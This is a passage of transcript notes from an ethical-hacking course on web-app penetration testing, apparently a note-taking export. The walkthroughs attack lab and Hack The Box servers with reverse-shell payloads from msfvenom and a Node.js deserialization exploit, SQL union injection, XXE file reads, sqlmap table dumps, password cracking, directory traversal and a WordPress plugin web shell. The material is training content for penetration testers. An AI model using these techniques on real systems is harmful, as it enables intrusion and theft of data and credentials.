> **[4:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=240)** Now we can navigate to our awen shell 10, dot 10, dot 10, dot 15, slash awen, dot ASPX. Now we get a command prompt box. Let's enter the "whoami" command. Who am I? Nt authority. This isn't a privileged account but we do have command execution access. Let's run the dir command and we'll use the eight character DOS file names. Dir, slash, docume-one and we can see the list of user folders. Cadaver is an extremely useful tool for WebDAV sites and makes gaining shell access fairly simple. It doesn't provide privileged access so there's more work to do. But having a shell or a command execution is a great start.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Nikto]] (3), [[Nmap]] (2), [[ASP.NET]] (1)
> **Env Vars:** aspx (6), http (4), asp (4), put (2), pen (1)
> **Definitions:** is an  (2), is a  (2)
> **Tools:** command line (1), bash (1), command prompt (1)
> **Speakers:** - web (1), - [male (1), - it (1)
> **CLI Commands:** find (1), ls (1)
> **Code Identifiers:** cmbasp (1)
> **URLs:** [asp.net](https://asp.net) (1)

#### [Checking web page source](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=0)** - [Instructor] Sometimes a challenging problem can be solved with some basic checks. And for the web pen tester, one of the simplest is to check the page source to see whether there are any clues. Let's take a look at the Hack the Box Calamity server, its IP address: 10.10.10.27. This is a Brotherhood Software site, which is under development. If we check the page source, it doesn't reveal a great deal other than some strange comments in the code. We'll not get any further here. Let's use [[Dirb]] to do a quick check for hidden pages, dirb [http://10.10.10.27](http://10.10.10.27). dirb [http://10.10.10.27](http://10.10.10.27). We found an admin.[[PHP]] file as well as the standard index and service-status files. Let's go take a look at it. Okay, this invites us to log in to the administrator page. If we check the source, we find that it seems to have the user and password swapped. So if we have credentials, we need to use them in the opposite way. It's also interesting to see that the page has a scroll bar, yet there's no long lines of text. Let's scroll. Here, we see a comment that provides us with the password. Let's close this and try to log in with the username "admin" and this password, remembering the fields are labeled incorrectly, and we'll enter "admin" and "skoupidotenekes",
>
> **[1:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=98)** and "skoupidotenekes", and we're in. We've been able to check the source of the webpage and find the credentials we need and how to use them.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Dirb]] (3), [[PHP]] (1)
> **CLI Commands:** find (2), php (1)
> **Versions:** 10.10.10 (3)
> **URLs:** [http://10.10.10.27](http://10.10.10.27) (2)
> **File Paths:** admin.php (1)
> **Env Vars:** dirb (1)
> **Definitions:** is a  (1)
> **Speakers:** - [instructor] (1)

#### [Injecting HTML into a web page](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=0)** - [Presenter] In our previous video, we found the credentials to access the calamity server. Once we logged in, we found what appears to be a webpage, crafted by a somewhat disgruntled employee. On the webpage, we can see an [[HTML]] entry box. Let's enter some HTML <B>Z< /B> appa, and we get Zappa. Okay, we're running HTML. It's worth checking now whether that HTML supports, an active scripting language, perhaps [[PHP]]. Let's try a PHP echo command, <?php echo' <p> Lumpy Gravy is good </p> ' ; And show me the page. Lumpy Gravy is good. Yep. It supports PHP. So let's create a simple, PHP meterpreter reverse shell using [[Metasploit|MSFvenom]]. Our IP address is 10.10.14.11 and we'll use port 2222. msfvenom -p php /meterpreter /reverse_tcp
>
> **[1:36](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=96)** LHOST= 10.10.14.11 and our LPORT= 2222 Okay, we have the PHP code, so let's copy that. Before we paste and run it, we'll need to set up a meterpreter listener, in [[Metasploit]]. We'll type [[Metasploit|msfconsole]]. use multi/handler. set payload php /meterpreter/ reverse_tcp. set lhost 10.10.14.11 set lport 2222 And run. And now let's paste our PHP code, and show the page. Okay, we've got a meterpreter session running now, so let's activate it. sessions 1 and we'll check the sysinfo. It's a calamity server. We can drop into a shell. whoami
>
> **[3:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=191)** I'm www.data, so this isn't a privileged shell. Nevertheless. Let's look at the home folder. ls /home and we can see salvas. Let's have a look, ls/home/salvas. And amongst other things, we can see the user.txt file. And if we cat /home/ salvas/user.txt We can see we have the user token. Calamity shows us that checking the simple things, can sometimes save a lot of effort. Not all [[Penetration Testing]] requires, complex exploit activity. We've been able to get into a full user shell and retrieve the token with relatively little effort.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[PHP]] (9), [[HTML]] (4), [[Metasploit|Msfvenom]] (2), [[Metasploit]] (1), [[Metasploit|Msfconsole]] (1)
> **CLI Commands:** php (9), ls (2), cat (1)
> **Env Vars:** php (6), html (4), lhost (1), lport (1)
> **Versions:** 10.10.14 (3)
> **File Paths:** user.txt (1), salvas/user.txt (1)
> **Code Identifiers:** reverse_tcp (2)
> **Ports:** port 2222 (1)
> **Cross-References:** previous video (1)

#### [Exploiting tools left on websites](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=0)** - [Instructor] We'll often see [[PHP]] being used on websites, and there are many tools that developers use for doing their development. In some cases, these tools are left active. Let's take a look at the Hack The Box site Bashed, which is on IP address 10.10.10.68. Okay, we're presented with Arrexel's Development site and it's a phpbash site. This is a website which presents information on a tool called phpbash, which can be used to enable easy remote Bashed scripting on a server. There's nothing specifically for us to use here, however. Let's run DLRB to do a quick top level brute force attack and find out any additional webpages that might exist on the server. DLRB HTTP 10.10.10.68. Okay, DLRB has found a number of folders and pages for us. We'll leave that going, but let's have a look at the dev page. This has two files, phpbash, min php, and phpbash.php. It looks like this site isn't just providing information on phpbash, but it is actually an operational phpbash site. Let's click on phpbash.php. Okay, we've now got a command line at the bottom of the screen. Let's check who we are. We're WW data.
>
> **[1:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=92)** This is an unprivileged command execution. And let's see what our home user accounts are. ls /home, and we have scriptmanager and Arrexel.
>
> **[1:47](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=107)** And /home/arrexel, and we can see user.text.
>
> **[1:57](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=117)** And cat /home/arrexel/user.text,
>
> **[2:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=128)** and we can see the contents of the user flag. Okay, we've not had to upload a shell because we have a command line execution capability using the phpbash tool, which may have been left on for convenience to support web server troubleshooting. Using this, we've gained the user token and we have an excellent foothold on the server.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[PHP]] (4)
> **CLI Commands:** php (4), find (1), ls (1), cat (1)
> **Env Vars:** dlrb (3), php (1), http (1)
> **File Paths:** phpbash.php (2)
> **Versions:** 10.10.10 (2)
> **Tools:** command line (2)
> **Definitions:** is a  (1), is an  (1)
> **UI Navigation:** click on (1)

#### [Injecting SQL using Burp Suite](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=0)** - [Instructor] [[Burp Suite]] is a powerful tool, and we can use it directly to run an [[SQL]] injection attack. Let's take a look at the Hack the Box Europa server, which we believe may have an SQL injection vulnerability. Our preliminary enumeration has identified this server has a named admin portal called admin-portal.europacorp.[[HackTheBox|htb]]. Let's set that up in our hosts file. sudo nano /etc/hosts. And we'll set up 10.10.10.22. As admin-portal.europacorp.htb.
>
> **[0:53](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=53)** Okay, let's start at Burp Suite. And we'll go to Proxy. Turn off Intercept. And open the browser. And we'll go to https. admin-portal.europacorp.htb.
>
> **[1:17](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=77)** We've now got an admin portal login, which it would appear is still under construction. Let's send in a request with a correctly formatted email address and then check the message exchanges in Burp Suite. admin@europacorp.htb. And we'll put a password in of password. Okay. We can see we've received the login page GET request followed by our login POST. Let's look at that. We can see in the POST request that our credentials are at the bottom of the packet. Let's send the message to the Repeater. Action, Send to Repeater. One of the options to achieve SQL injection is to use a union injection technique. But we need to know how many columns we have in the table. We can find that out by trial and error. We'll change the information at the bottom of the packet to: email=" union all select null, null, null # and password=password. And that will attempt a three column union attack. Okay, so let's send that. Okay.
>
> **[2:51](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=171)** And that doesn't work. Let's try four columns. And that doesn't work. Let's try five. Okay, that works, and we get a 302 response. So let's follow the redirection. We can now select, from the Actions, Request in Browser, In original session. Copy the link. And paste it into our browser. And after a few seconds, we're redirected into the admin dashboard. We successfully used Burp Suite to inject an SQL union command to circumvent the authentication and deliver admin access to the website.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Burp Suite]] (4), [[SQL]] (4), [[HackTheBox|Htb]] (4)
> **Env Vars:** sql (4), post (2)
> **UI Navigation:** go to (2), open the (1)
> **CLI Commands:** sudo (1), find (1)
> **API Endpoints:** get  (1), post  (1)
> **Versions:** 10.10.10 (1)
> **Definitions:** is a  (1)
> **Prerequisites:** set up (1)

#### [Exploiting Node.js](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=0)** - [Narrator] [[Node.js]] is a web server technology built using Chrome's V8 [[JavaScript]] engine. It uses an event driven non-blocking communications model that makes it lightweight and efficient and suitable for large scale web use. This is supported by an open source library called [[npm]]. Node.js is used to collect [[Forms]] data, generate dynamic page content, and manipulate files and [[Databases]]. A Node.js module is started using the node command at the command line and will associate to a port. The module will be executed to process messages when a user connects to that port. Node.js is a form of [[Java]] engine. The key difference between JavaScript and Node.js is that execution of JavaScript occurs at the client whereas Node.js runs JavaScript on the server. Let's take a look at the Hack The Box Celestial server. Our enumeration shows us that port 3000 is open and delivering the Node.js Express framework service. Let's take a look at Celestial using [[Burp Suite]]. We'll go to proxy, set intercept off, and open the browser. And we'll navigate to "10.10.10.85:3000".
>
> **[1:30](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=90)** We get a 404, but when we refresh, we get a simple message telling us two plus two is 22. Back in Burp Suite, we can see there's an element "profile=" in the response message. We'll highlight the contents of the profile line, and we'll send it to the decoder. And in the decoder, we'll decode it as Base64. Okay, we get a set of identifiers and values. Let's change the values. We'll make the username "Akhtar". We'll make the country "Australia". We'll make the city "Melbourne". Let's change the number to five. Remove the [[Representational State Transfer (REST)|rest]] of the line and put a curly bracket closing. Okay, let's encode it as Base64 and we'll copy the resulting string. Let's right-click the response and send it to repeater. And let's replace the "Cookie profile"
>
> **[3:07](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=187)** with our new value and send that. Okay, we can see the responses returned. "Hey Akhtar, 5 + 5 is 55" We're now actively interacting with the Node.js server. Let's take a look at ajinabraham's [[GitHub]] site where he provides a Node.js reverse shell. We can see the usage instructions at the start of the code. We can use this to gain shell access to the server. I've already copied this in, so let's run the script with my IP address and use port 2222 for the reverse shell, and we'll use [[Python (Programming Language)|Python]] 2.7 for this, "njs.py 10.10.14.11" and "2222". Okay, that provides an immediate eval function which we can use. We can exploit to deserialization floor by using this. We need to set it up as a Node.js list, which I've already done. We need to prefix the function with the RCE identifier, and provide a leading string "$$ND_FUNC.function", and provide some trailing brackets. Okay, let's copy this. Go back to Burp Suite. Now let's transfer the encoded results to the repeater. Before we send it, we need to open a listener on port 2222,
>
> **[4:43](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=283)** "nc -lp 2222" and send. We can see the response as "invalid user type". This is expected. Let's check our listener. We can see we're connected. Let's find out who we are, "whoami". We're Sun, and let's find out where we are. We're in "/home/sun", and let's see what's in there. And let's have a look at Documents, and we can see two files, script.py and user.txt. And when we "cat Documents/user.txt",
>
> **[5:35](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=335)** we get the user token. Node.js sends commands to the server using Base64 encoding. By intercepting a message and replacing the data being sent, we can interact with the Node.js server. When combined with a usable vulnerability, this provides an ideal access path to get a shell.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Node.js]] (12), [[JavaScript]] (4), [[Burp Suite]] (3), [[npm]] (1), [[Forms]] (1)
> **CLI Commands:** node (13), make (3), find (2), npm (1), python (1)
> **File Paths:** node.js (12), njs.py (1), script.py (1), user.txt (1), documents/user.txt (1)
> **Ports:** port 2222 (2), port 3000 (1), :3000 (1)
> **UI Navigation:** go to (1), open the (1), navigate to (1), right-click (1)
> **Versions:** 10.10.10 (1), python 2 (1), 10.10.14 (1)
> **Env Vars:** rce (1), nd_func (1)
> **Tools:** command line (1), github (1)

#### [Injecting XML into a web page](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-xml-into-a-web-page?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-xml-into-a-web-page?u=76281980&t=0)** - XML is another technology which is used in webpages. If we can inject XML, then we may be able to use it to gain access to data. Let's see how we might inject some code into a server via an XML input field. For this testing, we'll use Mutillidae. We'll select XML external entities and open the XML validator page. And let's enter message "hello folks" and validate that. And this validates and we can see the message displayed. Let's exploit this webpage. We can input a slightly more complex XML construct. to access the contents of a file. In this case, we'll check the contents of /et cetera/ password and we'll do that with shriek doc type. And we'll give it to name, and shriek entity and we'll just call it F as a variable and system. And the system entity we want is the file /// et cetera / password.
>
> **[1:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-xml-into-a-web-page?u=76281980&t=89)** And we'll put out the message with the contents of that, and validate that. And we can see the contents of the /et cetera/ password file. This technique does have some limitations in terms of the content in the external file but it demonstrates the way in which we can exploit XML.

> [!info]- Semantic Content
>
> **Env Vars:** xml (7)
> **UI Navigation:** open the (1)
> **Speakers:** - xml (1)

#### [File access through a web application URL](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980&t=0)** - [Narrator] Easy Chat is a simple browser based chat server and we can use it to demonstrate how to exploit a web application in order to break into the system as a whole. This is a [[Windows]] based application and I have it running on IP address, 192.168.1.149. There are a number of vulnerabilities in this application. One of them enables us to use the URL to navigate to specific folders outside of the web root. Let's connect to Easy Chat using [[Burp Suite]]'s web browser. Go to proxy. Turn Intercept off and open the browser. And we'll go to 192.168.1.149. Here we see the chat interface. We're just looking at the default chat rooms that come with the software. Back in Burp Suite, let's send the HTTP request to repeater and in repeater in the request, we'll change the get and we'll just move up the directory tree and request the temp folder and a file I've placed in there called password.txt and we'll send that. And here we can see Sam Spades' user ID and password. We successfully carried out a directory traversal through the Windows system.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Windows]] (2), [[Burp Suite]] (2)
> **UI Navigation:** go to (2), open the (1)
> **Env Vars:** url (1), http (1)
> **Versions:** 192.168.1 (2)
> **Definitions:** is a  (2)
> **File Paths:** password.txt (1)
> **Speakers:** - [narrator] (1)


### 6. Content Management

[↑ Back to Table of Contents](#table-of-contents)

#### [Understanding CMS targets](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=0)** - [Instructor] A [[Content Management]] system, or CMS, is most often seen as a web-based application, which provides a framework for rapid development of a website. Without needing to understand complex [[HTML]] constructs, it will have a number of modules. The first is the web content interface, which allows a user to add the text, images, video, audio and so on, required for their website. The second is the content delivery application, which processes the stored content and creates the website pages. A CMS will have a database backend, which holds the content, and other capabilities, such as an administrative tool, wizards, logging, and so on. One of the popular personal CMS systems is [[WordPress]], designed for individuals to create their own personal website with an emphasis on third-party plugins and used extensively for blogging. The large ecosystem around WordPress means that users don't have to have specialized knowledge as whatever they need to do is likely available as a standard plugin. Joomla! and [[Drupal]] are two of the more sophisticated [[Content Management Systems (CMS)|content management systems]]. Often used by businesses, these have strong collaboration capabilities to enable distributed content development. Each CMS system works differently. However, they all deliver content which is created and accessed through a web browser.
>
> **[1:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=93)** The web developer adds or modifies content through the developer portal, and this updates the backend database. The content framework will usually add the links that are required to render that content in the appropriate place on the website. Some CMS systems enable changes to be published in real time. Others may be designed such that many developers can change and submit content, but only the site administrator can review and publish. Early versions of CMS provided a limited ability which enabled users to create simple websites, and anything more complex had to be coded by hand. Websites are now mostly developed using content management systems. Contemporary CMS systems are feature-rich and enable much more complex websites to be built and for many, there's a thriving ecosystem of plugin modules to add sophisticated functionality at the click of a button. There are many open-source content management systems, such as WordPress, Joomla! and Drupal. There are also some highly respected commercial systems, such as Sitefinity and Sitecore. Given their widespread adoption, it's now important for a pen tester to be not only familiar with content management system concepts, but also have hands-on experience testing them. From a pen testing perspective, by managing the technical content development, a CMS avoids many of the simpler mistakes that may occur in a hand-coded website.
>
> **[3:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=189)** However, CMSs have two features, which a pen tester will want to check for flaws, the ability to plug in active content, such as [[PHP]], and the fact that many users may store sensitive information, such as credentials, unprotected in the backend database.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[WordPress]] (3), [[Content Management Systems (CMS)|Content management systems]] (3), [[Content Management]] (2), [[Drupal]] (2), [[HTML]] (1)
> **Env Vars:** cms (8), html (1), php (1)
> **Analogies:** such as (5)
> **CLI Commands:** php (1)
> **Prerequisites:** required to (1)
> **Speakers:** - [instructor] (1)

#### [Getting into WordPress](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=0)** - [Speaker] [[WordPress]] is a very popular [[Content Management]] system for individual and small business users. However, it's not without its problems, both in the way it gets installed and also with some well publicized exploits. Let's check for exploits using searchsploit wordpress
>
> **[0:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=23)** and there's quite a few here. In fact, there's over a thousand covering the web application and its many plugins. We'll take a look at the Hack the Box enterprise system on IP address, 10.10.10.61.
>
> **[0:37](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=37)** - During enumeration, we found that five ports were open. http on ports 80 and 8080. https on port 443 SSH on port 22, and an unknown port 32812. Let's do some deeper probing. We'll start by enumerating the website at port 80 using Go Buster. Go Buster Dir-U HTTP 10.10.10.61 minus w slash users slash share slash Wordlists slash d buster slash directory list lowercase 2.3 medium dot txt and we'll check for [[PHP]] files. Okay, we've found a number of PHP files and folders including WP content, WP login dot php. WP includes. This indicates this is a WordPress site. We would normally let this run through to completion but just for the moment, we'll leave that. Let's check the HTTPS site on port 4 43 and we'll also add the K option to suppress checking certificates. Okay, we found a folder called Files.
>
> **[2:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=135)** Again, we could let this run through to completion but let's stop it here and go and check those files. HTTPS 10.10.10.10.61 slash files.
>
> **[2:35](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=155)** The files folder contains a file called L cars.zip. When we click on it, we get the option to save it. So let's do that. If we do some basic research we find this is a WordPress plugin in the Star Trek theme of the website. Okay, let's unzip L Cars and check it out. Unzip downloads slash l cars.zip
>
> **[3:12](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=192)** CD Lcars. And we can see we have three files. If we check L cars, db dot php nano l cars underscore db dot php
>
> **[3:31](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=211)** We can see that this takes a parameter called query. Okay. We can use this to do an [[SQL]] map check for injection. We know where the WordPress plugins are located and we can take a guess that it uses my sql so we can directly code the query and we'll do SQL MAP minus U HTTP 10.10.10.61
>
> **[4:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=243)** slash wp content and plugins which are where the plugins are located. The plugin we want is L cars, and the PHP file for it is L cars db dot php, and we'll give it a query parameter of 22, but it doesn't really matter what we give it. And minus minus DBMS equals my sql. We'll take a guess at that. We could do some research and find out that it is in fact my sql
>
> **[4:44](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=284)** - And we'll let that run. SQL MAP finds that the perimeter query is vulnerable to injection, so it can now start to enumerate the site. And the first thing we'll do is check the [[Databases]] with a minus minus dbs SQL map retrieves eight databases using a blind SQL injection approach. And interestingly we can see joomla here as well as WordPress. Let's have a look at the tables in the WordPress database so we'll select minus d WordPress minus minus tables.
>
> **[5:25](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=325)** Okay, let's now look at the WP users table minus T WP users minus minus dump.
>
> **[5:42](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=342)** Okay, we've dumped the table column details and we're now dumping the table contents. This takes a while as it dumps the whole table but we've achieved what we need, which is to detect and exploit an SQL injection and use this to dump out the complete WordPress database table by table.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[WordPress]] (9), [[SQL]] (9), [[PHP]] (7), [[Databases]] (2), [[Content Management]] (1)
> **Env Vars:** sql (6), php (3), http (2), https (2), map (2)
> **CLI Commands:** php (7), find (2), unzip (2), ssh (1), cd (1)
> **Versions:** 10.10.10 (4), 2.3 (1), 10.61 (1)
> **Ports:** port 443 (1), port 22 (1), port
32812 (1), port
80 (1), port 4 (1)
> **Definitions:** is a  (3)
> **Speakers:** - [speaker] (1), - during (1), - and (1)
> **UI Navigation:** click on (1)

#### [Shelling through WordPress](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=0)** - [Instructor] Let's log in to the admin portal of our own [[WordPress]] site. Admin, admin. At the left, we have the option to select plugins. And this provides the option of managing existing plugins, and adding new ones. If we do some research on plugins, we find that they're little more than a [[PHP]] script. We already have access to Carly's PHP shell, so all we need to do, is add the standard WordPress header. I've created a plugin called wphead.txt, which is just the header. I'll copy this, and add it to the standard PHP web shell. Nano/usr/share/webshells/php/php-reverse-shell.php.
>
> **[1:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=68)** Okay, and we'll go down and set our IP address, to 192.168.1.249. And our port to 2222. We'll save that, and let's call it wplug.php. We now need to zip this, because WordPress loads its plugins as zip files. So we'll zip to wplug.zip, wplug.php. Before we load the plugin, let's set up a listener. Nc -lp 2222. Okay, now let's add new, upload a plugin. We'll browse, to wplug.zip. Open that, and we'll install it now. And that's installed, so we'll activate it. And back at the listener, we now have a shell. And who am I? I'm www data. So, if we gain access to the administrative portal
>
> **[2:43](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=163)** on a WordPress site, we can easily turn this into a shell.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[PHP]] (8), [[WordPress]] (4)
> **CLI Commands:** php (8), find (1)
> **File Paths:** wplug.php (2), wphead.txt (1), nano/usr/share/webshells/php/php-reverse-shell.php (1)
> **Env Vars:** php (3)
> **Prerequisites:** set up (1), install (1)
> **Versions:** 192.168.1 (1)
> **Speakers:** - [instructor] (1)

#### [Exploiting Joomla via SQL](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=0)** - Let's see how we go about testing Joomla sites. We can use a tool called "joomscan" to do an initial check for vulnerabilities. "joomscan -url [http://192.168.1.176/joomla](http://192.168.1.176/joomla)"
>
> **[0:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=22)** and we'll "--enumerate-components".
>
> **[0:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=32)** Okay, there's a warning regarding the jssupport plugin but no conclusive evidence that it is or isn't vulnerable. In fact, we're running version 1.1.5 of the jssupportticket ticket tool, so this alert isn't really relevant. However, let's check out [[Exploit-DB]]. There are a number of exploits relating to jssupportticket. Let's take a look at the [[SQL]] injection exploit for version 1.1.5. At the bottom of the exploit, we have the [[SQLmap]] details. Let's copy that and change it to point to our target URL. And we'll run that. I've run this previously to prepare it so it runs through quickly this time and returns a successful injection point. We can now run this again with the "--dbs" flag, and we'll list the [[Databases]]. We get the list of databases, not just Joomla, but all the databases in the [[Microsoft SQL Server|SQL server]]. But let's select the Joomla database and check its tables. So, "-D joomla_db --tables".
>
> **[1:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=114)** We get the list of tables including one called "jm_users". Let's take a look at it. And we'll put "jm_users" and we'll dump it. And we have the admin user account and its associated password hash. I've copied the hash and stored it in a file called "jmhash". So let's use [[John the Ripper]] to crack it: "[[John the Ripper|john]] jmhash", and we recover the password, which is "admin". Web apps offer many opportunities for exploitation to penetration testers and third party plugins for [[Content Management Systems (CMS)|content management systems]] are a good place to look for easy footholds.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Databases]] (3), [[Exploit-DB]] (1), [[SQL]] (1), [[SQLmap]] (1), [[Microsoft SQL Server|Sql server]] (1)
> **Versions:** version 1 (2), 1.5 (2), 192.168.1 (1)
> **Code Identifiers:** jm_users (2), joomla_db (1)
> **Env Vars:** sql (2), url (1)
> **URLs:** [http://192.168.1.176/joomla](http://192.168.1.176/joomla) (1)
> **UI Navigation:** select the (1)
> **Warnings:** warning (1)
> **Speakers:** - let (1)


### Conclusion

[↑ Back to Table of Contents](#table-of-contents)

#### [What's next](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980&t=0)** - [Malcolm] I'd really like to thank you for joining me for this course. I hope you enjoyed learning about some advanced techniques in testing websites. Web is a major attack surface, and protecting web applications is a critical part of the [[Cybersecurity]] activities across governments and businesses, and it's a major component of the offensive security certified professional qualification. This course has given you a great foundation for testing web applications, but it's just one of many areas of security that you need to understand as a professional pen tester. There's always something new in cyber security, and if you're interested in learning more then check out the full security segment of the library where new courses are added regularly. You'll find courses on all aspects of security. You can take additional courses on [[Ethical Hacking]] and pen testing, as well as courses which will prepare you for specific examinations and specific job roles. I'd like to invite you to go to my author page where you can find more courses in the advanced pen testing series, as well as a wider coverage of security. In particular, you may want to take a look at my more detailed [[Active Directory]], [[SQL]] Injections and Advanced Techniques courses. Thanks again for joining me on this course and I hope to see you again soon for more courses on pen testing and cyber security.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Cybersecurity]] (1), [[Ethical Hacking]] (1), [[Active Directory]] (1), [[SQL]] (1)
> **CLI Commands:** find (2)
> **Definitions:** is a  (2)
> **Env Vars:** sql (1)
> **Speakers:** - [malcolm] (1)


## Instructor

- [[Malcolm Shore]]

## Skills Covered

- Penetration Testing

## Path Context

### In [[Become a Penetration Tester]]
← [[Kali Linux for Advanced Pen Testing and Ethical Hacking]] | **5 of 8** | [[Advanced Pen Testing Techniques for Active Directory]] →

## Appears In
